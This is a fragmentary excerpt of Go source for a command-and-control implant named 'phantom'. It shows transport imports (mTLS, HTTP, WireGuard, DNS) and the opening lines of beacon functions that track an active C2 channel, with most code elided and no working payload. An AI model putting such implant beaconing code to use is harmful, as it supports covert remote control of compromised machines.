...
import (
	...
	"github.com/cryptdefender3232/phantom/implant/phantom/transports/mtls"
	...
	"github.com/cryptdefender3232/phantom/implant/phantom/transports/httpclient"
	// {{end}}

	// {{if .Config.IncludeWG}}
	"net"

	"github.com/cryptdefender3232/phantom/implant/phantom/transports/wireguard"
...
func httpBeacon(uri *url.URL) *Beacon {
	...
	var client *httpclient.PhantomHTTPClient
	var err error
...
func dnsBeacon(uri *url.URL) *Beacon {
	var client *dnsclient.PhantomDNSClient
	var err error
	beacon := &Beacon{
		ActiveC2: uri.String(),
		Init: func() error {
